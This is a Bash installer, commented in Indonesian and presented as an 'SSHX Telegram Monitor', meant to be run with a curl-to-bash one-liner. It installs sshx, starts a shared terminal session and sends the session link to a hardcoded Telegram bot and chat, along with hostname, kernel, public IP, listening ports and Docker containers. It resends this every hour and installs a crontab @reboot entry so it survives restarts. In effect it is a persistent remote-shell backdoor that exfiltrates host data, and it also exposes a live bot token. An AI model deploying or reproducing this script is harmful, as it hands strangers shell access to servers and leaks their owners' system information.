#!/bin/bash

# ============================================
# SSHX Telegram Monitor - Auto Installer
# ============================================
# Cara pakai: 
# bash -c "$(curl -fsSL https://raw.githubusercontent.com/username/repo/main/sshx-telegram-installer.sh)"
# ============================================

set -e  # Exit jika ada error

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# ============================================
# Konfigurasi Telegram
# ============================================
BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"
REPORT_INTERVAL=3600  # 1 jam dalam detik

# ============================================
# Fungsi Logging
# ============================================
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_step() {
    echo -e "${BLUE}[STEP]${NC} $1"
}

# ============================================
# Fungsi Deteksi OS
# ============================================
detect_os() {
    log_step "Mendeteksi sistem operasi..."
    
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        VER=$VERSION_ID
    else
        OS=$(uname -s)
        VER=$(uname -r)
    fi
    
    case $OS in
        ubuntu|debian)
            PKG_MANAGER="apt-get"
            INSTALL_CMD="apt-get install -y"
            log_info "Deteksi: Ubuntu/Debian"
            ;;
        centos|rhel|fedora)
            PKG_MANAGER="yum"
            INSTALL_CMD="yum install -y"
            [ -f /etc/fedora-release ] && PKG_MANAGER="dnf" && INSTALL_CMD="dnf install -y"
            log_info "Deteksi: CentOS/RHEL/Fedora"
            ;;
        alpine)
            PKG_MANAGER="apk"
            INSTALL_CMD="apk add"
            log_info "Deteksi: Alpine Linux"
            ;;
        arch)
            PKG_MANAGER="pacman"
            INSTALL_CMD="pacman -S --noconfirm"
            log_info "Deteksi: Arch Linux"
            ;;
        *)
            log_error "OS tidak dikenal: $OS"
            exit 1
            ;;
    esac
    
    echo "OS=$OS" > /tmp/sshx_os_detected
    echo "PKG_MANAGER=$PKG_MANAGER" >> /tmp/sshx_os_detected
}

# ============================================
# Fungsi Install Dependencies
# ============================================
install_dependencies() {
    log_step "Menginstall dependencies yang diperlukan..."
    
    # Update package list
    if [ "$PKG_MANAGER" = "apt-get" ]; then
        apt-get update -y
    elif [ "$PKG_MANAGER" = "yum" ] || [ "$PKG_MANAGER" = "dnf" ]; then
        $PKG_MANAGER update -y
    fi
    
    # Install curl (penting untuk download)
    if ! command -v curl &> /dev/null; then
        log_info "Menginstall curl..."
        $INSTALL_CMD curl
    fi
    
    # Install tmux
    if ! command -v tmux &> /dev/null; then
        log_info "Menginstall tmux..."
        $INSTALL_CMD tmux
    else
        log_info "tmux sudah terinstall"
    fi
    
    # Install jq (untuk parsing JSON)
    if ! command -v jq &> /dev/null; then
        log_info "Menginstall jq..."
        $INSTALL_CMD jq
    fi
    
    # Install sshx (via curl)
    if ! command -v sshx &> /dev/null; then
        log_info "Menginstall sshx..."
        curl -fsSL https://sshx.io/get | bash
        export PATH=$PATH:$HOME/.sshx/bin
    else
        log_info "sshx sudah terinstall"
    fi
    
    log_info "Semua dependencies terinstall"
}

# ============================================
# Fungsi Kirim ke Telegram
# ============================================
send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$message" \
        -d "parse_mode=HTML" > /dev/null
}

# ============================================
# Fungsi Buat Script Monitor
# ============================================
create_monitor_script() {
    log_step "Membuat script monitor dengan fitur lengkap..."
    
    cat > /usr/local/bin/sshx-telegram-monitor.sh << 'EOF'
#!/bin/bash

# ============================================
# SSHX Telegram Monitor - Core Script
# Dengan fitur: 10 detik pertama detail, selanjutnya 1 jam
# ============================================

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"
REPORT_INTERVAL=3600  # 1 jam

# Load OS info
source /tmp/sshx_os_detected 2>/dev/null || echo "OS=unknown"

# File untuk tracking
TEMP_DIR="/tmp/sshx-monitor"
mkdir -p $TEMP_DIR
COUNTER_FILE="$TEMP_DIR/counter"
FIRST_RUN_FILE="$TEMP_DIR/first_run_done"
LAST_LINK_FILE="$TEMP_DIR/last_link"
LAST_REPORT_FILE="$TEMP_DIR/last_report"

# Initialize counter
if [ ! -f $COUNTER_FILE ]; then
    echo "0" > $COUNTER_FILE
fi

# ============================================
# Fungsi Kirim Telegram
# ============================================
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$1" \
        -d "parse_mode=HTML" > /dev/null
}

# ============================================
# Fungsi Dapatkan Info Host Lengkap
# ============================================
get_host_info() {
    HOSTNAME=$(hostname)
    DOMAIN=$(hostname -d 2>/dev/null || echo "none")
    UNAME=$(uname -a)
    KERNEL=$(uname -r)
    OS_RELEASE=$(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2 2>/dev/null || echo "Unknown")
    
    echo "🖥️ <b>HOST INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━
• Hostname: $HOSTNAME
• Domain: $DOMAIN
• OS: $OS_RELEASE
• Kernel: $KERNEL
• Uname: <code>$UNAME</code>"
}

# ============================================
# Fungsi Dapatkan Info Sistem
# ============================================
get_system_info() {
    CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    MEM_TOTAL=$(free -h | grep Mem | awk '{print $2}')
    MEM_USED=$(free -h | grep Mem | awk '{print $3}')
    MEM_PERC=$(free | grep Mem | awk '{printf "%.1f%%", $3/$2 * 100}')
    DISK=$(df -h / | awk 'NR==2 {print $5}')
    UPTIME=$(uptime | sed 's/.*up //; s/,.*//')
    LOAD=$(uptime | awk -F'load average:' '{print $2}')
    IP_PUBLIC=$(curl -s ifconfig.me || echo "Unknown")
    IP_LOCAL=$(hostname -I | awk '{print $1}')
    DATE=$(date "+%Y-%m-%d %H:%M:%S")
    USERS=$(who | wc -l)
    PROCESSES=$(ps aux | wc -l)
    
    echo "📊 <b>SYSTEM STATUS</b>
━━━━━━━━━━━━━━━━━━━━━
• CPU Usage: $CPU%
• Memory: $MEM_USED / $MEM_TOTAL ($MEM_PERC)
• Disk: $DISK
• Uptime: $UPTIME
• Load Avg: $LOAD
• Users: $USERS
• Processes: $PROCESSES
• IP Public: $IP_PUBLIC
• IP Local: $IP_LOCAL
• Waktu: $DATE"
}

# ============================================
# Fungsi Dapatkan SSHX Output Detail
# ============================================
get_sshx_detail() {
    local output_file="$TEMP_DIR/sshx_output_$$"
    
    # Jalankan sshx dan capture output lengkap dengan timeout 5 detik
    timeout 5 sshx --quiet > "$output_file" 2>&1 &
    SSHX_PID=$!
    sleep 3  # Beri waktu untuk dapat output
    
    # Kill proses sshx
    kill $SSHX_PID 2>/dev/null || true
    
    # Baca output
    if [ -f "$output_file" ]; then
        cat "$output_file"
        rm -f "$output_file"
    fi
}

# ============================================
# Fungsi Parse SSHX Link
# ============================================
get_sshx_link() {
    sshx --quiet 2>&1 | grep -o 'https://sshx.io/s/[^ ]*' | head -1
}

# ============================================
# Fungsi Kirim Detail 10 Detik Pertama
# ============================================
send_detailed_report() {
    local sshx_output
    local sshx_link
    
    log_info "Mengirim laporan detail 10 detik pertama..."
    
    # Dapatkan output sshx detail
    sshx_output=$(get_sshx_detail)
    sshx_link=$(echo "$sshx_output" | grep -o 'https://sshx.io/s/[^ ]*' | head -1)
    
    # Format pesan detail
    DETAIL_MSG="🔥 <b>SSHX DETAIL REPORT (10 DETIK PERTAMA)</b>
━━━━━━━━━━━━━━━━━━━━━

$(get_host_info)

━━━━━━━━━━━━━━━━━━━━━
🔗 <b>SSHX LINK:</b>
<code>${sshx_link:-"Tidak didapatkan"}</code>

━━━━━━━━━━━━━━━━━━━━━
📝 <b>SSHX OUTPUT DETAIL:</b>
<code>${sshx_output:-"Tidak ada output"}</code>

━━━━━━━━━━━━━━━━━━━━━
$(get_system_info)

━━━━━━━━━━━━━━━━━━━━━
✅ <b>Monitor aktif - Report normal setiap 1 jam</b>"
    
    send_telegram "$DETAIL_MSG"
    
    # Simpan link untuk referensi
    echo "$sshx_link" > "$LAST_LINK_FILE"
}

# ============================================
# Fungsi Kirim Report Normal (1 Jam)
# ============================================
send_normal_report() {
    local current_link
    local last_link
    
    current_link=$(get_sshx_link)
    last_link=$(cat "$LAST_LINK_FILE" 2>/dev/null || echo "none")
    
    # Cek apakah link berubah
    if [ -n "$current_link" ] && [ "$current_link" != "$last_link" ]; then
        echo "$current_link" > "$LAST_LINK_FILE"
        LINK_STATUS="🆕 <b>LINK BARU!</b> $current_link"
    else
        LINK_STATUS="✅ Link: $last_link"
    fi
    
    # Dapatkan info tambahan
    NETSTAT=$(ss -tulpn | grep LISTEN | head -5 | sed 's/^/  /' | tr '\n' ' ')
    DOCKER=$(docker ps --format "table {{.Names}}\t{{.Status}}" 2>/dev/null | head -3 | sed 's/^/  /' || echo "  Docker tidak ada")
    
    REPORT_MSG="📊 <b>LAPORAN PERIODIK (1 JAM)</b>
━━━━━━━━━━━━━━━━━━━━━

$(get_host_info)

━━━━━━━━━━━━━━━━━━━━━
🔗 <b>SSHX STATUS:</b>
$LINK_STATUS

━━━━━━━━━━━━━━━━━━━━━
$(get_system_info)

━━━━━━━━━━━━━━━━━━━━━
🌐 <b>NETWORK (LISTEN PORTS):</b>
<code>$NETSTAT</code>

━━━━━━━━━━━━━━━━━━━━━
🐳 <b>DOCKER (jika ada):</b>
<code>$DOCKER</code>

━━━━━━━━━━━━━━━━━━━━━
⏰ Next report: +1 jam
🔍 Status: Normal monitoring"
    
    send_telegram "$REPORT_MSG"
    date +%s > "$LAST_REPORT_FILE"
}

# ============================================
# Main Loop
# ============================================
main_loop() {
    local counter=0
    local first_run=1
    
    # Kirim notifikasi start
    send_telegram "🚀 <b>SSHX MONITOR DIMULAI</b>
━━━━━━━━━━━━━━━━━━━━━
$(get_host_info)
$(get_system_info | head -10)
━━━━━━━━━━━━━━━━━━━━━
⏰ Akan kirim detail dalam 10 detik pertama"
    
    while true; do
        # CEK APAKAH 10 DETIK PERTAMA?
        if [ $first_run -eq 1 ]; then
            # Tunggu 10 detik untuk kumpulkan data
            sleep 10
            send_detailed_report
            first_run=0
            counter=0
            continue
        fi
        
        # REPORT NORMAL SETIAP 1 JAM
        if [ $counter -ge 3600 ]; then
            send_normal_report
            counter=0
        fi
        
        sleep 10
        counter=$((counter + 10))
    done
}

# Trap untuk handle exit
trap 'send_telegram "⚠️ <b>SSHX MONITOR STOPPED</b> $(date)"' EXIT

# Jalankan main loop
main_loop
EOF

    chmod +x /usr/local/bin/sshx-telegram-monitor.sh
    log_info "Script monitor dibuat di /usr/local/bin/sshx-telegram-monitor.sh"
}

# ============================================
# Fungsi Setup Tmux & Auto Start
# ============================================
setup_tmux_and_start() {
    log_step "Setup tmux dan auto-start..."
    
    # Kill existing tmux session jika ada
    tmux kill-session -t sshx-monitor 2>/dev/null || true
    
    # Buat tmux session baru
    tmux new-session -d -s sshx-monitor
    
    # Jalankan script monitor di dalam tmux
    tmux send-keys -t sshx-monitor "bash /usr/local/bin/sshx-telegram-monitor.sh" C-m
    
    log_info "Tmux session 'sshx-monitor' telah dibuat"
    
    # Setup auto-start on boot
    (crontab -l 2>/dev/null | grep -v "sshx-telegram-monitor"; echo "@reboot sleep 10 && tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'") | crontab -
    
    log_info "Auto-start via crontab telah ditambahkan"
}

# ============================================
# Fungsi Info Cara Pakai
# ============================================
show_usage_info() {
    cat << EOF

${GREEN}╔════════════════════════════════════════════════════════╗
║         INSTALASI SELESAI! 🎉                          ║
║   FITUR: 10 DETIK DETAIL + REPORT 1 JAM                ║
╚════════════════════════════════════════════════════════╝${NC}

${BLUE}📋 INFORMASI:${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Bot Token: ${YELLOW}8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA${NC}
• Chat ID: ${YELLOW}-1003847935504${NC}
• Report: ${YELLOW}10 detik pertama (DETAIL) + setiap 1 jam${NC}

${GREEN}✅ YANG AKAN DITERIMA DI TELEGRAM:${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1️⃣ ${YELLOW}10 DETIK PERTAMA:${NC}
   • Host info lengkap (uname -a, OS, kernel)
   • Output detail sshx
   • Link SSHX
   • System status (CPU, RAM, Disk)

2️⃣ ${YELLOW}SETIAP 1 JAM:${NC}
   • Host info
   • Status SSHX (link aktif/tidak)
   • System status
   • Network ports
   • Docker status (jika ada)
   • Dan info lainnya

${BLUE}📌 PERINTAH PENTING:${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• ${YELLOW}Lihat langsung:${NC} tmux attach -t sshx-monitor
• ${YELLOW}Keluar tmux:${NC} Ctrl+B lalu D
• ${YELLOW}Restart monitor:${NC} tmux kill-session -t sshx-monitor && tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'
• ${YELLOW}Stop monitor:${NC} tmux kill-session -t sshx-monitor

${GREEN}🎉 MONITOR AKTIF! CEK TELEGRAM ANDA.${NC}
EOF
}

# ============================================
# Main Execution
# ============================================
main() {
    clear
    echo "${BLUE}╔════════════════════════════════════════════════════════╗"
    echo "║     SSHX TELEGRAM MONITOR - DETIK + JAMAN               ║"
    echo "║     Fitur: 10 detik detail + Report 1 jam               ║"
    echo "╚════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Deteksi OS
    detect_os
    
    # Install semua dependencies
    install_dependencies
    
    # Buat script monitor
    create_monitor_script
    
    # Setup tmux dan start
    setup_tmux_and_start
    
    # Kirim notifikasi ke Telegram
    log_step "Mengirim notifikasi ke Telegram..."
    
    HOSTNAME=$(hostname)
    IP=$(curl -s ifconfig.me)
    UNAME=$(uname -a | cut -c1-50)...
    
    send_telegram "✅ <b>INSTALASI SSHX MONITOR SELESAI</b>
━━━━━━━━━━━━━━━━━━━━━
• Hostname: $HOSTNAME
• IP: $IP
• Uname: <code>$UNAME</code>
• Waktu: $(date)
━━━━━━━━━━━━━━━━━━━━━
📊 Mode: 10 detik detail + report 1 jam
⏰ Tunggu 10 detik untuk laporan pertama..."
    
    # Tampilkan info
    show_usage_info
    
    log_info "Instalasi selesai! Monitor berjalan di tmux session 'sshx-monitor'"
}

# Jalankan main function
main

# Exit sukses
exit 0
